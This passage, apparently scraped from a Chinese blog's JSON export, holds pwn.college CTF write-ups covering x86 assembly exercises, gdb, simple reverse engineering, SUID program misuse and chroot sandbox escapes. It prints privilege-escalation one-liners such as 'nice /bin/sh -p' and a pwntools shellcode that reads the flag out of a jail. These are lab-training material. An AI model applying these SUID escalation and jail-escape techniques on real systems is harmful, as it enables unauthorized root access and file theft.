0x1337</code>，</p>\n<p>如果是按照目的意思程序的汇编代码长这样子：</p>\n<pre><code class=\"asm\">.section .text\n    .intel_syntax noprefix\n    .global _start\n    _start :\n        mov rdi, 0x1337\n</code></pre>\n<p>但是可以直接用pwntools传输<code>mov rdi, 0x1337</code>这一句。</p>\n<pre><code class=\"python\">#!/usr/bin/env python3\nimport pwn\npwn.context.log_level = \"INFO\"\npwn.context.encoding = \"latin\"\npwn.context.arch = \"amd64\"\npwn.warnings.simplefilter(\"ignore\")\n\nassembly = \"\"\"mov rdi, 0x1337\"\"\"\n\nproc = pwn.process(\"/challenge/embryoasm_level1\")\nprint(proc.readrepeat(1).decode())\nproc.send(pwn.asm(assembly))\nprint(proc.readrepeat(1).decode())\n</code></pre>\n<p>一个好用的exp，可以直接在非根目录下执行。</p>\n<h4 id=\"Level2\">Level2<a class=\"post-anchor\" href=\"#Level2\"></a></h4><p><code>add rdi, 0x331337</code></p>\n<h4 id=\"Level3\">Level3<a class=\"post-anchor\" href=\"#Level3\"></a></h4><p><a href=\"https://rin777-1306176007.cos.ap-nanjing.myqcloud.com/%E6%88%AA%E5%B1%8F2022-01-30%20%E4%B8%8A%E5%8D%8811.38.12.png\" data-caption=\"截屏2022-01-30 上午11.38.12\" data-fancybox=\"images\"><img src=\"https://rin777-1306176007.cos.ap-nanjing.myqcloud.com/%E6%88%AA%E5%B1%8F2022-01-30%20%E4%B8%8A%E5%8D%8811.38.12.png\" alt=\"截屏2022-01-30 上午11.38.12\"></a></p>\n<p>出师未捷身先死。</p>\n<p>这里应该是对于汇编乘法对于寄存器的改变不太清楚<a href=\"https://rin777-1306176007.cos.ap-nanjing.myqcloud.com/%E6%88%AA%E5%B1%8F2022-01-30%20%E4%B8%8A%E5%8D%8811.48.15.png\" data-caption=\"截屏2022-01-30 上午11.48.15\" data-fancybox=\"images\"><img src=\"https://rin777-1306176007.cos.ap-nanjing.myqcloud.com/%E6%88%AA%E5%B1%8F2022-01-30%20%E4%B8%8A%E5%8D%8811.48.15.png\" alt=\"截屏2022-01-30 上午11.48.15\"></a></p>\n<p>​        问题出在64位乘法会产生128位乘积，储存在<code>rdx:rax</code>中由于题目给的都是低32位的所以高32位全部是0，相当于<code>mul</code>之后<code>rdx</code>就变成了0，自然拿不到flag。</p>\n<h4 id=\"Level4\">Level4<a class=\"post-anchor\" href=\"#Level4\"></a></h4><p>​        简单的64位汇编除法。相关的指令都已经给出了，抄作业就行。</p>\n<h4 id=\"Level5\">Level5<a class=\"post-anchor\" href=\"#Level5\"></a></h4><p>​        依然是简单的除法，涉及到余数的处理。既然余数存在<code>rdx</code>，<code>mov rax，rdx</code>就行。</p>\n<h4 id=\"Level6\">Level6<a class=\"post-anchor\" href=\"#Level6\"></a></h4><p>​        对于低位的数字运算（好烦），</p>\n<pre><code class=\"asm\">rax = rdi modulo 256             ;2^8\nrbx = rsi module 65536        ;2^16\n</code></pre>\n<p>​        <a href=\"https://rin777-1306176007.cos.ap-nanjing.myqcloud.com/%E6%88%AA%E5%B1%8F2022-01-30%20%E4%B8%8B%E5%8D%882.47.33.png\" data-caption=\"截屏2022-01-30 下午2.47.33\" data-fancybox=\"images\"><img src=\"https://rin777-1306176007.cos.ap-nanjing.myqcloud.com/%E6%88%AA%E5%B1%8F2022-01-30%20%E4%B8%8B%E5%8D%882.47.33.png\" alt=\"截屏2022-01-30 下午2.47.33\"></a></p>\n<p>所以edi和esi没有低八位吗？</p>\n<p>可能是吧，就像正常来说ebp和esp也没有低八位。</p>\n<h4 id=\"Level7\">Level7<a class=\"post-anchor\" href=\"#Level7\"></a></h4><p>​        进行移位操作的练习，需要让rax为rdi的b3位的值</p>\n<p>​        </p>\n<p><a href=\"https://rin777-1306176007.cos.ap-nanjing.myqcloud.com/%E6%88%AA%E5%B1%8F2022-01-30%20%E4%B8%8B%E5%8D%883.37.16.png\" data-caption=\"截屏2022-01-30 下午3.37.16\" data-fancybox=\"images\"><img src=\"https://rin777-1306176007.cos.ap-nanjing.myqcloud.com/%E6%88%AA%E5%B1%8F2022-01-30%20%E4%B8%8B%E5%8D%883.37.16.png\" alt=\"截屏2022-01-30 下午3.37.16\"></a></p>\n<h4 id=\"Level8\">Level8<a class=\"post-anchor\" href=\"#Level8\"></a></h4><p>​        与操作。</p>\n<p><a href=\"https://rin777-1306176007.cos.ap-nanjing.myqcloud.com/%E6%88%AA%E5%B1%8F2022-01-30%20%E4%B8%8B%E5%8D%883.46.06.png\" data-caption=\"截屏2022-01-30 下午3.46.06\" data-fancybox=\"images\"><img src=\"https://rin777-1306176007.cos.ap-nanjing.myqcloud.com/%E6%88%AA%E5%B1%8F2022-01-30%20%E4%B8%8B%E5%8D%883.46.06.png\" alt=\"截屏2022-01-30 下午3.46.06\"></a></p>\n<h4 id=\"Level9\">Level9<a class=\"post-anchor\" href=\"#Level9\"></a></h4><p>​        简单的奇偶判断，rax应该是1与rdi lsb异或后的结果。</p>\n<p><a href=\"https://rin777-1306176007.cos.ap-nanjing.myqcloud.com/%E6%88%AA%E5%B1%8F2022-01-30%20%E4%B8%8B%E5%8D%885.13.57.png\" data-caption=\"截屏2022-01-30 下午5.13.57\" data-fancybox=\"images\"><img src=\"https://rin777-1306176007.cos.ap-nanjing.myqcloud.com/%E6%88%AA%E5%B1%8F2022-01-30%20%E4%B8%8B%E5%8D%885.13.57.png\" alt=\"截屏2022-01-30 下午5.13.57\"></a></p>\n<h4 id=\"Level10\">Level10<a class=\"post-anchor\" href=\"#Level10\"></a></h4><p>​        简单的间接寻址。</p>\n<p><a href=\"https://rin777-1306176007.cos.ap-nanjing.myqcloud.com/%E6%88%AA%E5%B1%8F2022-01-30%20%E4%B8%8B%E5%8D%885.33.10.png\" data-caption=\"截屏2022-01-30 下午5.33.10\" data-fancybox=\"images\"><img src=\"https://rin777-1306176007.cos.ap-nanjing.myqcloud.com/%E6%88%AA%E5%B1%8F2022-01-30%20%E4%B8%8B%E5%8D%885.33.10.png\" alt=\"截屏2022-01-30 下午5.33.10\"></a></p>\n<p>​            要注意的是这里面有一些规范，大概就是不能<code>mov [register],number;</code>。也就是说涉及到寄存器间接寻址的操作都不能用立即数，而是需要利用寄存器。</p>\n<h4 id=\"Level11\">Level11<a class=\"post-anchor\" href=\"#Level11\"></a></h4><p>​        涉及对byte，word ，dword和qword的size的理解。<a href=\"https://rin777-1306176007.cos.ap-nanjing.myqcloud.com/%E6%88%AA%E5%B1%8F2022-01-30%20%E4%B8%8B%E5%8D%885.42.02.png\" data-caption=\"截屏2022-01-30 下午5.42.02\" data-fancybox=\"images\"><img src=\"https://rin777-1306176007.cos.ap-nanjing.myqcloud.com/%E6%88%AA%E5%B1%8F2022-01-30%20%E4%B8%8B%E5%8D%885.42.02.png\" alt=\"截屏2022-01-30 下午5.42.02\"></a></p>\n<h4 id=\"Level12\">Level12<a class=\"post-anchor\" href=\"#Level12\"></a></h4><p>​        <del>我发现这个东西最恼人的不是做本身而是看题，不想看题好烦，题好长。但是只看问题又不能瞬间找到思路。。。</del></p>\n<p>​        考点是利用寄存器间接寻址设置寄存器的值为指定值。<del>（本来以为要考虑小端序造成的影响但其实不用考虑）</del></p>\n<p>​        <a href=\"https://rin777-1306176007.cos.ap-nanjing.myqcloud.com/%E6%88%AA%E5%B1%8F2022-01-30%20%E4%B8%8B%E5%8D%885.52.50.png\" data-caption=\"截屏2022-01-30 下午5.52.50\" data-fancybox=\"images\"><img src=\"https://rin777-1306176007.cos.ap-nanjing.myqcloud.com/%E6%88%AA%E5%B1%8F2022-01-30%20%E4%B8%8B%E5%8D%885.52.50.png\" alt=\"截屏2022-01-30 下午5.52.50\"></a></p>\n<h4 id=\"Level13\">Level13<a class=\"post-anchor\" href=\"#Level13\"></a></h4><p>​        也就是一个按照地址偏移寻址的方式的理解。（基址寻址）</p>\n<p><a href=\"https://rin777-1306176007.cos.ap-nanjing.myqcloud.com/%E6%88%AA%E5%B1%8F2022-01-30%20%E4%B8%8B%E5%8D%889.46.14.png\" data-caption=\"截屏2022-01-30 下午9.46.14\" data-fancybox=\"images\"><img src=\"https://rin777-1306176007.cos.ap-nanjing.myqcloud.com/%E6%88%AA%E5%B1%8F2022-01-30%20%E4%B8%8B%E5%8D%889.46.14.png\" alt=\"截屏2022-01-30 下午9.46.14\"></a></p>\n<h4 id=\"Level14\">Level14<a class=\"post-anchor\" href=\"#Level14\"></a></h4><p>​        对于出入栈相关指令的简单理解。</p>\n<p>​        做题的时候卡了一下，因为没有正确理解题意，我以为是需要把栈顶值减去rdi后的值存到rax中就行，但是题意其实是让我们改变栈顶的值，所以我们将rax取出减rdi后还需要push回去。（还是吃了英语不好的亏捏）</p>\n<p><a href=\"https://rin777-1306176007.cos.ap-nanjing.myqcloud.com/%E6%88%AA%E5%B1%8F2022-01-30%20%E4%B8%8B%E5%8D%8810.11.05.png\" data-caption=\"截屏2022-01-30 下午10.11.05\" data-fancybox=\"images\"><img src=\"https://rin777-1306176007.cos.ap-nanjing.myqcloud.com/%E6%88%AA%E5%B1%8F2022-01-30%20%E4%B8%8B%E5%8D%8810.11.05.png\" alt=\"截屏2022-01-30 下午10.11.05\"></a></p>\n<p>​        </p>\n<h4 id=\"Level15\">Level15<a class=\"post-anchor\" href=\"#Level15\"></a></h4><p>​        还是围绕栈的先入后出的练习。</p>\n<p>​        <a href=\"https://rin777-1306176007.cos.ap-nanjing.myqcloud.com/%E6%88%AA%E5%B1%8F2022-01-30%20%E4%B8%8B%E5%8D%8810.19.15.png\" data-caption=\"截屏2022-01-30 下午10.19.15\" data-fancybox=\"images\"><img src=\"https://rin777-1306176007.cos.ap-nanjing.myqcloud.com/%E6%88%AA%E5%B1%8F2022-01-30%20%E4%B8%8B%E5%8D%8810.19.15.png\" alt=\"截屏2022-01-30 下午10.19.15\"></a></p>\n<p>​            </p>\n<h4 id=\"Level16\">Level16<a class=\"post-anchor\" href=\"#Level16\"></a></h4><p>​        利用rsp来寻址。</p>\n<p><a href=\"https://rin777-1306176007.cos.ap-nanjing.myqcloud.com/%E6%88%AA%E5%B1%8F2022-01-30%20%E4%B8%8B%E5%8D%8810.36.37.png\" data-caption=\"截屏2022-01-30 下午10.36.37\" data-fancybox=\"images\"><img src=\"https://rin777-1306176007.cos.ap-nanjing.myqcloud.com/%E6%88%AA%E5%B1%8F2022-01-30%20%E4%B8%8B%E5%8D%8810.36.37.png\" alt=\"截屏2022-01-30 下午10.36.37\"></a></p>\n<p>​        </p>\n<p>​        这里我把rdx清零了，属于是多此一举。</p>\n<h4 id=\"Level17\">Level17<a class=\"post-anchor\" href=\"#Level17\"></a></h4><p>​        这题干怎么越来越长。</p>\n<p>​        等会儿再做。</p>\n<p>​        </p>\n</body></html>","tags":["pwncollege"]},{"title":"ProgramMisuse","url":"/2022/03/03/pwncollege_ProgramMisuse/","content":"<html><head></head><body><p>​        关于这个module，做出题目的话大致有两个思路，一个是利用<code>/bin/sh</code>    来对整个shell提权，另外一个是利用设置了suid的特殊程序来读取flag。一般来说是第二个方法比较简单，但是有时候只有第一个方法可以行得通。</p>\n<h4 id=\"Level1\">Level1<a class=\"post-anchor\" href=\"#Level1\"></a></h4><p>​        没有看视频，并不知道这个Misuse是什么意义，但是level1只要执行给的程序就能get flag。</p>\n<p><a href=\"https://rin777-1306176007.cos.ap-nanjing.myqcloud.com/%E6%88%AA%E5%B1%8F2022-01-26%20%E4%B8%8B%E5%8D%884.56.40.png\" data-caption=\"截屏2022-01-26 下午4.56.40\" data-fancybox=\"images\"><img src=\"https://rin777-1306176007.cos.ap-nanjing.myqcloud.com/%E6%88%AA%E5%B1%8F2022-01-26%20%E4%B8%8B%E5%8D%884.56.40.png\" alt=\"截屏2022-01-26 下午4.56.40\"></a></p>\n<h4 id=\"Level2\">Level2<a class=\"post-anchor\" href=\"#Level2\"></a></h4><p>​        到第二题大概懂它的用意了，来补充一些知识吧。</p>\n<p>​        <a href=\"https://rin777-1306176007.cos.ap-nanjing.myqcloud.com/%E6%88%AA%E5%B1%8F2022-01-26%20%E4%B8%8B%E5%8D%884.57.44.png\" data-caption=\"截屏2022-01-26 下午4.57.44\" data-fancybox=\"images\"><img src=\"https://rin777-1306176007.cos.ap-nanjing.myqcloud.com/%E6%88%AA%E5%B1%8F2022-01-26%20%E4%B8%8B%E5%8D%884.57.44.png\" alt=\"截屏2022-01-26 下午4.57.44\"></a></p>\n<p>​        可以看到原本我们只用普通用户权限，但是由于可执行程序将 <code>/usr/bin/more</code>    设置为了超级权限，使得这个功能能够读取到flag的内容。</p>\n<p>​        然后关于SUID，也就是Set uid ID。如果将对应位设置为S，就能够以可执行文件的owner权限执行它们。</p>\n<p>​        （SUID）仅对二进制可执行文件有效。</p>\n<p>参考：[<a href=\"https://www.cnblogs.com/sparkdev/p/9651622.html\">Linux 特殊权限 SUID,SGID,SBIT </a>]</p>\n<h4 id=\"Level3-9\">Level3-9<a class=\"post-anchor\" href=\"#Level3-9\"></a></h4><p>​        <code>xxx flag</code></p>\n<h4 id=\"Level-10\">Level 10<a class=\"post-anchor\" href=\"#Level-10\"></a></h4><p>​        指令为<code>rev</code>，所以对于获得的flag我们需要翻转一下，可以就直接用<code>rev</code>来。</p>\n<h4 id=\"Level-11\">Level 11<a class=\"post-anchor\" href=\"#Level-11\"></a></h4><p>​        控制<code>od</code>的参数，并需要简单的脚本处理字符串的空格。</p>\n<h4 id=\"Level12-17\">Level12-17<a class=\"post-anchor\" href=\"#Level12-17\"></a></h4><p>​        按照给的可执行文件来。</p>\n<p><a href=\"https://rin777-1306176007.cos.ap-nanjing.myqcloud.com/%E6%88%AA%E5%B1%8F2022-01-28%20%E4%B8%8B%E5%8D%886.34.25.png\" data-caption=\"截屏2022-01-28 下午6.34.25\" data-fancybox=\"images\"><img src=\"https://rin777-1306176007.cos.ap-nanjing.myqcloud.com/%E6%88%AA%E5%B1%8F2022-01-28%20%E4%B8%8B%E5%8D%886.34.25.png\" alt=\"截屏2022-01-28 下午6.34.25\"></a></p>\n<p>​        之前碰到这个问题的时候并咩有理解，现在算是理解了。</p>\n<h4 id=\"Level21\">Level21<a class=\"post-anchor\" href=\"#Level21\"></a></h4><p><code>ar -r a flag</code></p>\n<p><code>cat a</code></p>\n<h4 id=\"Level27\">Level27<a class=\"post-anchor\" href=\"#Level27\"></a></h4><p><code>nice /bin/sh -p</code></p>\n<h4 id=\"Level28\">Level28<a class=\"post-anchor\" href=\"#Level28\"></a></h4><p><a href=\"https://rin777-1306176007.cos.ap-nanjing.myqcloud.com/%E6%88%AA%E5%B1%8F2022-03-02%20%E4%B8%8B%E5%8D%885.09.57.png\" data-caption=\"截屏2022-03-02 下午5.09.57\" data-fancybox=\"images\"><img src=\"https://rin777-1306176007.cos.ap-nanjing.myqcloud.com/%E6%88%AA%E5%B1%8F2022-03-02%20%E4%B8%8B%E5%8D%885.09.57.png\" alt=\"截屏2022-03-02 下午5.09.57\"></a></p>\n<h4 id=\"Level29\">Level29<a class=\"post-anchor\" href=\"#Level29\"></a></h4><p>​        利用<code>stdbuf</code>设置输出缓冲为0，利用<code>/bin/sh</code>执行并提权。</p>\n<h4 id=\"Level30\">Level30<a class=\"post-anchor\" href=\"#Level30\"></a></h4><p>​    </p>\n<p><a href=\"https://rin777-1306176007.cos.ap-nanjing.myqcloud.com/%E6%88%AA%E5%B1%8F2022-03-03%20%E4%B8%8A%E5%8D%889.38.12.png\" data-caption=\"截屏2022-03-03 上午9.38.12\" data-fancybox=\"images\"><img src=\"https://rin777-1306176007.cos.ap-nanjing.myqcloud.com/%E6%88%AA%E5%B1%8F2022-03-03%20%E4%B8%8A%E5%8D%889.38.12.png\" alt=\"截屏2022-03-03 上午9.38.12\"></a></p>\n<h4 id=\"Level34\">Level34<a class=\"post-anchor\" href=\"#Level34\"></a></h4><p><a href=\"https://rin777-1306176007.cos.ap-nanjing.myqcloud.com/%E6%88%AA%E5%B1%8F2022-03-03%20%E4%B8%8A%E5%8D%889.50.31.png\" data-caption=\"截屏2022-03-03 上午9.50.31\" data-fancybox=\"images\"><img src=\"https://rin777-1306176007.cos.ap-nanjing.myqcloud.com/%E6%88%AA%E5%B1%8F2022-03-03%20%E4%B8%8A%E5%8D%889.50.31.png\" alt=\"截屏2022-03-03 上午9.50.31\"></a></p>\n<h4 id=\"Level35\">Level35<a class=\"post-anchor\" href=\"#Level35\"></a></h4><p><a href=\"https://rin777-1306176007.cos.ap-nanjing.myqcloud.com/%E6%88%AA%E5%B1%8F2022-03-03%20%E4%B8%8A%E5%8D%889.55.21.png\" data-caption=\"截屏2022-03-03 上午9.55.21\" data-fancybox=\"images\"><img src=\"https://rin777-1306176007.cos.ap-nanjing.myqcloud.com/%E6%88%AA%E5%B1%8F2022-03-03%20%E4%B8%8A%E5%8D%889.55.21.png\" alt=\"截屏2022-03-03 上午9.55.21\"></a></p>\n<h4 id=\"Level36\">Level36<a class=\"post-anchor\" href=\"#Level36\"></a></h4><p><a href=\"https://rin777-1306176007.cos.ap-nanjing.myqcloud.com/%E6%88%AA%E5%B1%8F2022-03-03%20%E4%B8%8A%E5%8D%889.57.38.png\" data-caption=\"截屏2022-03-03 上午9.57.38\" data-fancybox=\"images\"><img src=\"https://rin777-1306176007.cos.ap-nanjing.myqcloud.com/%E6%88%AA%E5%B1%8F2022-03-03%20%E4%B8%8A%E5%8D%889.57.38.png\" alt=\"截屏2022-03-03 上午9.57.38\"></a></p>\n<h4 id=\"Level37\">Level37<a class=\"post-anchor\" href=\"#Level37\"></a></h4><p><a href=\"https://rin777-1306176007.cos.ap-nanjing.myqcloud.com/%E6%88%AA%E5%B1%8F2022-03-03%20%E4%B8%8A%E5%8D%8810.00.42.png\" data-caption=\"截屏2022-03-03 上午10.00.42\" data-fancybox=\"images\"><img src=\"https://rin777-1306176007.cos.ap-nanjing.myqcloud.com/%E6%88%AA%E5%B1%8F2022-03-03%20%E4%B8%8A%E5%8D%8810.00.42.png\" alt=\"截屏2022-03-03 上午10.00.42\"></a></p>\n<h4 id=\"Level38\">Level38<a class=\"post-anchor\" href=\"#Level38\"></a></h4><p><a href=\"https://rin777-1306176007.cos.ap-nanjing.myqcloud.com/%E6%88%AA%E5%B1%8F2022-03-03%20%E4%B8%8A%E5%8D%8810.02.08.png\" data-caption=\"截屏2022-03-03 上午10.02.08\" data-fancybox=\"images\"><img src=\"https://rin777-1306176007.cos.ap-nanjing.myqcloud.com/%E6%88%AA%E5%B1%8F2022-03-03%20%E4%B8%8A%E5%8D%8810.02.08.png\" alt=\"截屏2022-03-03 上午10.02.08\"></a></p>\n<h4 id=\"level39\">level39<a class=\"post-anchor\" href=\"#level39\"></a></h4><p><a href=\"https://rin777-1306176007.cos.ap-nanjing.myqcloud.com/%E6%88%AA%E5%B1%8F2022-03-03%20%E4%B8%8A%E5%8D%8810.04.09.png\" data-caption=\"截屏2022-03-03 上午10.04.09\" data-fancybox=\"images\"><img src=\"https://rin777-1306176007.cos.ap-nanjing.myqcloud.com/%E6%88%AA%E5%B1%8F2022-03-03%20%E4%B8%8A%E5%8D%8810.04.09.png\" alt=\"截屏2022-03-03 上午10.04.09\"></a></p>\n<h4 id=\"Level41\">Level41<a href=\"https://rin777-1306176007.cos.ap-nanjing.myqcloud.com/%E6%88%AA%E5%B1%8F2022-03-03%20%E4%B8%8A%E5%8D%8810.17.52.png\" data-caption=\"截屏2022-03-03 上午10.17.52\" data-fancybox=\"images\"><img src=\"https://rin777-1306176007.cos.ap-nanjing.myqcloud.com/%E6%88%AA%E5%B1%8F2022-03-03%20%E4%B8%8A%E5%8D%8810.17.52.png\" alt=\"截屏2022-03-03 上午10.17.52\"></a><a class=\"post-anchor\" href=\"#Level41\"></a></h4><h4 id=\"Level42\">Level42<a class=\"post-anchor\" href=\"#Level42\"></a></h4><p><a href=\"https://rin777-1306176007.cos.ap-nanjing.myqcloud.com/%E6%88%AA%E5%B1%8F2022-03-03%20%E4%B8%8A%E5%8D%8810.20.23.png\" data-caption=\"截屏2022-03-03 上午10.20.23\" data-fancybox=\"images\"><img src=\"https://rin777-1306176007.cos.ap-nanjing.myqcloud.com/%E6%88%AA%E5%B1%8F2022-03-03%20%E4%B8%8A%E5%8D%8810.20.23.png\" alt=\"截屏2022-03-03 上午10.20.23\"></a></p>\n<h4 id=\"Level45\">Level45<a class=\"post-anchor\" href=\"#Level45\"></a></h4><p><a href=\"https://rin777-1306176007.cos.ap-nanjing.myqcloud.com/%E6%88%AA%E5%B1%8F2022-03-03%20%E4%B8%8A%E5%8D%8810.52.14.png\" data-caption=\"截屏2022-03-03 上午10.52.14\" data-fancybox=\"images\"><img src=\"https://rin777-1306176007.cos.ap-nanjing.myqcloud.com/%E6%88%AA%E5%B1%8F2022-03-03%20%E4%B8%8A%E5%8D%8810.52.14.png\" alt=\"截屏2022-03-03 上午10.52.14\"></a></p>\n<h4 id=\"Level47\">Level47<a class=\"post-anchor\" href=\"#Level47\"></a></h4><p><a href=\"https://rin777-1306176007.cos.ap-nanjing.myqcloud.com/%E6%88%AA%E5%B1%8F2022-03-03%20%E4%B8%8A%E5%8D%8810.59.45.png\" data-caption=\"截屏2022-03-03 上午10.59.45\" data-fancybox=\"images\"><img src=\"https://rin777-1306176007.cos.ap-nanjing.myqcloud.com/%E6%88%AA%E5%B1%8F2022-03-03%20%E4%B8%8A%E5%8D%8810.59.45.png\" alt=\"截屏2022-03-03 上午10.59.45\"></a></p>\n<h4 id=\"Level49\">Level49<a class=\"post-anchor\" href=\"#Level49\"></a></h4><p><a href=\"https://rin777-1306176007.cos.ap-nanjing.myqcloud.com/%E6%88%AA%E5%B1%8F2022-03-03%20%E4%B8%8A%E5%8D%8811.05.44.png\" data-caption=\"截屏2022-03-03 上午11.05.44\" data-fancybox=\"images\"><img src=\"https://rin777-1306176007.cos.ap-nanjing.myqcloud.com/%E6%88%AA%E5%B1%8F2022-03-03%20%E4%B8%8A%E5%8D%8811.05.44.png\" alt=\"截屏2022-03-03 上午11.05.44\"></a></p>\n</body></html>","tags":["pwncollege"]},{"title":"Debugging Refresher","url":"/2022/02/14/Debugging%20Refresher/","content":"<html><head></head><body><h4 id=\"Level1\">Level1<a class=\"post-anchor\" href=\"#Level1\"></a></h4><p>​        直接r，然后c到断点。</p>\n<h4 id=\"Level2\">Level2<a class=\"post-anchor\" href=\"#Level2\"></a></h4><p>​        <code>p/x $r12</code></p>\n<h4 id=\"Level3\">Level3<a class=\"post-anchor\" href=\"#Level3\"></a></h4><p>​        不好描述，可以根据后面的正确随机数在栈中找到对应的位置，然后重新执行并输入。</p>\n<h4 id=\"Level4\">Level4<a class=\"post-anchor\" href=\"#Level4\"></a></h4><p>​        。。。。</p>\n<h4 id=\"Level5\">Level5<a class=\"post-anchor\" href=\"#Level5\"></a></h4><p>gdb脚本。</p>\n</body></html>","tags":["pwncollege"]},{"title":"ReverseEngineering","url":"/2022/02/15/ReverseEngineering/","content":"<html><head></head><body><h4 id=\"Level1-0\">Level1.0<a class=\"post-anchor\" href=\"#Level1-0\"></a></h4><p><a href=\"https://rin777-1306176007.cos.ap-nanjing.myqcloud.com/%E6%88%AA%E5%B1%8F2022-02-15%20%E4%B8%8A%E5%8D%884.12.04.png\" data-caption=\"截屏2022-02-15 上午4.12.04\" data-fancybox=\"images\"><img src=\"https://rin777-1306176007.cos.ap-nanjing.myqcloud.com/%E6%88%AA%E5%B1%8F2022-02-15%20%E4%B8%8A%E5%8D%884.12.04.png\" alt=\"截屏2022-02-15 上午4.12.04\"></a></p>\n<h4 id=\"Level1-1\">Level1.1<a class=\"post-anchor\" href=\"#Level1-1\"></a></h4><p>​        同上，一样的做法。</p>\n<h4 id=\"Level2-0\">Level2.0<a class=\"post-anchor\" href=\"#Level2-0\"></a></h4><p>​        交换idx3和idx4的位置</p>\n<h4 id=\"Level2-1\">Level2.1<a class=\"post-anchor\" href=\"#Level2-1\"></a></h4><p>​        交换idx1和idx4.</p>\n<p>​        ps：</p>\n<p><a href=\"https://rin777-1306176007.cos.ap-nanjing.myqcloud.com/%E6%88%AA%E5%B1%8F2022-02-15%20%E4%B8%8B%E5%8D%883.28.51.png\" data-caption=\"截屏2022-02-15 下午3.28.51\" data-fancybox=\"images\"><img src=\"https://rin777-1306176007.cos.ap-nanjing.myqcloud.com/%E6%88%AA%E5%B1%8F2022-02-15%20%E4%B8%8B%E5%8D%883.28.51.png\" alt=\"截屏2022-02-15 下午3.28.51\"></a></p>\n<p>​        输入五个字符，转化为ascii后以int类型贮存，从栈布局可以看出v10大小是4个字，所以第五个字被储存在v11。</p>\n<h4 id=\"Level3-0\">Level3.0<a class=\"post-anchor\" href=\"#Level3-0\"></a></h4><p>​        reverse</p>\n<h4 id=\"Level3-1\">Level3.1<a class=\"post-anchor\" href=\"#Level3-1\"></a></h4><p>​        同上。</p>\n<h4 id=\"Level4-0\">Level4.0<a class=\"post-anchor\" href=\"#Level4-0\"></a></h4><pre><code class=\"c\"> for ( j = 0; j &lt;= 3; ++j )\n  {\n    for ( k = 0; k &lt; 4 - j; ++k )\n    {\n      if ( *((_BYTE *)&amp;v15 + k - 14) &gt; *((_BYTE *)&amp;v15 + k - 13) )\n      {\n        v4 = *((_BYTE *)&amp;v15 + k - 14);\n        *((_BYTE *)&amp;v15 + k - 14) = *((_BYTE *)&amp;v15 + k - 13);\n        *((_BYTE *)&amp;v15 + k - 13) = v4;\n      }\n    }\n  }\n</code></pre>\n<p>​        一个简单的冒泡排序算法。</p>\n<h4 id=\"level4-1\">level4.1<a class=\"post-anchor\" href=\"#level4-1\"></a></h4><p>​        同上</p>\n<h4 id=\"Level5-0\">Level5.0<a class=\"post-anchor\" href=\"#Level5-0\"></a></h4><pre><code class=\"c\"> for ( j = 0; j &lt;= 4; ++j )\n    *((_BYTE *)&amp;v13 + j - 14) ^= 0xCDu;\n</code></pre>\n<p>​        异或加密，需要用到简单的脚本（手抠也不是不行）</p>\n<h4 id=\"Level5-1\">Level5.1<a class=\"post-anchor\" href=\"#Level5-1\"></a></h4><p>​        同上，好饿。</p>\n<h4 id=\"Level6-0\">Level6.0<a class=\"post-anchor\" href=\"#Level6-0\"></a></h4><p>​        可以批量导出数据，避免手动处理数组</p>\n<p><a href=\"https://rin777-1306176007.cos.ap-nanjing.myqcloud.com/%E6%88%AA%E5%B1%8F2022-02-15%20%E4%B8%8B%E5%8D%885.15.04.png\" data-caption=\"截屏2022-02-15 下午5.15.04\" data-fancybox=\"images\"><img src=\"https://rin777-1306176007.cos.ap-nanjing.myqcloud.com/%E6%88%AA%E5%B1%8F2022-02-15%20%E4%B8%8B%E5%8D%885.15.04.png\" alt=\"截屏2022-02-15 下午5.15.04\"></a></p>\n<p>​        程序的逻辑是输入的字符串进行降序排序-&gt;条件异或，我们需要通过结果反推输入值，</p>\n<p>​        因为程序一定会对字符串进行降序排序，所以输入字符串的顺序其实意义不大，无论是怎么打乱，最后处理的结果都是一样的。</p>\n<pre><code class=\"python\">x = [0x64, 0x59, 0x60, 0x59, 0x7F, 0x40, 0x77, 0x4E, 0x77, 0x4C, 0x75, 0x4D, 0x73, 0x4B, 0x71]\nfor i in range(15):\n    if (i % 2  == 0):\n        x[i] ^= 0x10\n    else:\n      x[i] ^= 0x29\n\n    a = chr(x[i])\n    print(a)\n</code></pre>\n</body></html>","tags":["pwncollege"]},{"title":"Sandboxing","url":"/2022/02/28/Sandboxing/","content":"<html><head></head><body><h4 id=\"Level1\">Level1<a class=\"post-anchor\" href=\"#Level1\"></a></h4><p>​        首先考察<code>chroot</code></p>\n<p>​        因为程序在将根目录设置为<code>/jail</code>的时候并没有切换当前工作目录为<code>/jail</code>，所以我们实际上还是在<code>/</code>目录，因此可以直接通过<code>argv[1]</code>    读取flag。</p>\n<p>​        执行脚本的时候需要添加<code>cwd</code>参数，使其工作目录为<code>/</code></p>\n<h4 id=\"Level2\">Level2<a class=\"post-anchor\" href=\"#Level2\"></a></h4><pre><code class=\"python\">shellcode = asm(shellcraft.readfile('flag',1))\np = process([\"/challenge/babyjail_level2\", \"/\"],cwd='/')\np.send(shellcode)\n</code></pre>\n<h4 id=\"Level3\">Level3<a class=\"post-anchor\" href=\"#Level3\"></a></h4><p>​            关键源码：</p>\n<pre><code class=\"c\"> assert(argc &gt; 1);\n\n    puts(\"Checking to make sure you're not trying to open the flag.\\n\");\n    assert(strstr(argv[1], \"flag\") == NULL);\n\n    int fd = open(argv[1], O_RDONLY|O_NOFOLLOW);\n    if (fd &lt; 0)\n        printf(\"Failed to open the file located at `%s`.\\n\", argv[1]);\n    else\n        printf(\"Successfully opened the file located at `%s`.\\n\", argv[1]);\n\n    char jail_path[] = \"/tmp/jail-XXXXXX\";\n    assert(mkdtemp(jail_path) != NULL);\n\n    printf(\"Creating a jail at `%s`.\\n\", jail_path);\n\n    assert(chroot(jail_path) == 0);\n\n    puts(\"Moving the current working directory into the jail.\\n\");\n    assert(chdir(\"/\") == 0);\n\n    int fffd = open(\"/flag\", O_WRONLY | O_CREAT);\n    write(fffd, \"FLAG{FAKE}\", 10);\n    close(fffd);\n\n</code></pre>\n</body></html>","tags":["pwncollege"]},{"title":"Program_interaction","url":"/2022/01/17/Program_interaction/","content":"<html><head></head><body><p>「前面不太记得了，从level3记起」</p>\n<h3 id=\"level3\">level3<a class=\"post-anchor\" href=\"#level3\"></a></h3><p><code> ./embryoio_level3  xkbdyoisnx</code>    </p>\n<h4 id=\"Level4\">Level4<a class=\"post-anchor\" href=\"#Level4\"></a></h4><p><code>export jouixn = xxx</code></p>\n<h4 id=\"Level5\">Level5<a class=\"post-anchor\" href=\"#Level5\"></a></h4><p>​    一个标准输入重定向的考察，</p>\n<p><code>./embryoio_level5 &lt; /tmp/mihsjr</code></p>\n<p>​        还需要编辑<code>mihsjr 